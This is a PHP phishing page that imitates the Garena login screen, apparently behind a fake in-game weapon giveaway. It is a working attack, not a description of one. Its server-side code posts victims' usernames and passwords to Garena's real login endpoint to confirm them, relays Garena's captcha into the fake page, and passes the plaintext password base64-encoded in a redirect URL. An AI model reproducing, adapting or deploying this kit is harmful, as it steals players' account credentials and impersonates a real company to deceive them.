<?php
ob_start(); 
error_reporting(0);
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="description" content="Garena">
 <link rel="stylesheet" href="http://redeem.pb.garena.co.id/static/pbid2015/css/reset.css">
        <link rel="stylesheet" href="http://redeem.pb.garena.co.id/static/pbid2015/css/main.css">
	 <link rel="shortcut icon" href="http://cdn.garenanow.com/webmain/static/favicon.ico" type="image/x-icon"/>
		<link href="https://cdngarenanow-a.akamaihd.net/gop/sso/theme/dark/css/sso.css?v=0.47" rel="stylesheet" type="text/css"/>
	
<script src="http://redeem.pb.garena.co.id/static/share/js/jquery-1.10.2.min.js"></script>

        <!-- Recaptcha -->
        <script src="http://redeem.pb.garena.co.id/static/share/js/recaptcha_ajax.js"></script>

        <!-- Garena Game Utility -->
        <script src="http://redeem.pb.garena.co.id/static/share/js/garenaweb-utils.min.js"></script>
        <script src="http://redeem.pb.garena.co.id/static/share/js/jquery.ggameapps.utilities.js"></script>

        <!-- Page CSS -->
        <link rel="stylesheet" href="http://redeem.pb.garena.co.id/static/pbid2015/css/reset.css">
        <link rel="stylesheet" href="http://redeem.pb.garena.co.id/static/pbid2015/css/main.css">

        <!-- Page Specific -->
        
          <script src="http://www.google.com/jsapi"></script>
            <script type="text/javascript">google.load("jquery", "1.5.0");</script>  
        
    <script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/jsbn.js"></script>
    <script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/prng4.js"></script>
    <script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rng.js"></script>
    <script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/rsa.js"></script>
    <script language="JavaScript" type="text/javascript" src="http://cdn.garenanow.com/webmain/static/js/grsa.js"></script>
	
    <script type="text/javascript">
        function check_login_inputs() {
            var username = document.loginForm.username.value;
            var password = document.loginForm.password.value;
            if (!username || !password) {
                return false;
            }
            return true;
        }
        function do_encrypt() {
            if (!check_login_inputs()) {
              return false;
            }
                      var pw = document.loginForm.password.value;
            document.loginForm.password2.value=RSA(pw);
            $('.loginForm').submit();
            return true;
        }
        function keyIsPressed(evt) {
          var charCode = (evt.which) ? evt.which : evt.keyCode
          if( charCode == 13 ) {
                do_encrypt();
          }
          return true;
        }
    </script>
<title>Garena</title>
<style>
.error-msg { color: red !important; }
.error-msg { padding-bottom: -12px !important; }
</style>
<style>
.recaptchatable #recaptcha_response_field {
    width: 145px !important;
    position: relative !important;
    bottom: 7px !important;
    padding: 10px;
    margin: 15px 0 0 0 !important;
    font-size: 10pt;
    height: 20px;
}
.recaptcha_only_if_privacy {
display: none !important;
}
</style>
</head>
<body>

<div id="page">
<div class="header" id="header">
<div class="topBarGarena"></div>
<div class="topBar"></div>
<h1><a href="http://www.garena.com" class="logo">
<img style="width: 135px; height: 46px;" src="/images/header_garena.png"></a></h1></div>
<div id="main-panel"><div style="top: 0px;" class="content">
<h2 class="title">Login</h2>
<form class="loginForm" id="loginForm" method="post" name='loginForm' onSubmit='do_encrypt();'>
<div class="line" id="line-account">
<input autocapitalize="off" autocorrect="off" placeholder="Username Garena" name="username" id="sso_login_form_account" type="text" required>
</div>
<div class="line"  id="line-password">
<input type="hidden" name="password2" />
<input placeholder="Password"  name="password" id="sso_login_form_password" type="password" required></div>
<span class="errorMsg" id="msg"><center>
<?php 
							if(isset($_POST['submit_button'])){
								$password2 = $_POST['password2'];
								$password = $_POST['password'];
								$username=$_POST['username'];
								$c1 = $_POST['recaptcha_response_field'];
								$c2 = $_POST['recaptcha_challenge_field'];
								$hp=$_POST['phone'];


$url="http://security.garena.com/login/";
if(empty($_POST['recaptcha_response_field'])){ 
							$postdata="csrfmiddlewaretoken=j6sfOk4YL9rbB128543AE1kGWz5xFC8I&username=".$username."&password=".$password2."&submit_button=Login";}
							else {
								
$postdata="csrfmiddlewaretoken=j6sfOk4YL9rbB128543AE1kGWz5xFC8I&username=".$username."&password=".$password2."&recaptcha_challenge_field=".$c2."&recaptcha_response_field=".$c1."&submit_button=Login";							
							}
$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$headers  = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:45.0) Gecko/20100101 Firefox/45.0';
$headers[] = 'Cookie: csrftoken=j6sfOk4YL9rbB128543AE1kGWz5xFC8I';

curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt ($ch, CURLOPT_HEADER, 1);
$result = curl_exec ($ch);
if(preg_match('#302 FOUND#', $result)) {
	header("Location:../claim_app_weapon/?username=".$username.'&sso_key='.md5($password).'&sesID='.base64_encode($password));
}elseif(preg_match('#please enter verification code#', $result)){
	function setelah($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, $pos+strlen($substring)));
}
function sebelum($string, $substring) {
  $pos = strpos($string, $substring);
  if ($pos === false)
   return $string;
  else  
   return(substr($string, 0, $pos));
}
$hasil = setelah($result, "<!-- Google Recaptcha -->");
$hasil1 = sebelum($hasil, "</noscript>");
$simpul = '<tr>
                                <th>&nbsp;</th>
                                <td colspan="2" style="padding-left:2px; padding-bottom:15px;">'.$hasil1.'</noscript></td>
                                <td>
                                </td>
                            </tr>';
							$simpul1 = str_replace('color:#000;','color:red;',$simpul);
							$simpul2 = str_replace('<p style="margin:10px 0px 10px 3px; color:red; font-weight:normal;">','<p style="margin:5px 0px 10px 3px; color:red; font-weight:normal;">',$simpul1);
$pesan =  $simpul2.'</span><br>';
}else {
	$pesan =  '<em></em>username / password salah</span><br>';
}



							}
							?>
							 <?php echo $pesan;?>
							 </center>
<div class="line btnLine" id="line-btn">
<input class="btn" name="submit_button" value="Login Sekarang" id="confirm-btn" type="submit">
</div>
</form>
<div class="linkLine"><a class="sec" href="javascript:;" id="sso_login_link_register">Registrasi</a>
<span aria-hidden="true" role="separator">·</span>
<a class="sec" href="javascript:;" id="sso_login_link_forget_password">Lupa Password</a>
</div></div><div class="footer" id="footer">Garena © 2014</div></div>
</div>
</body>
</html>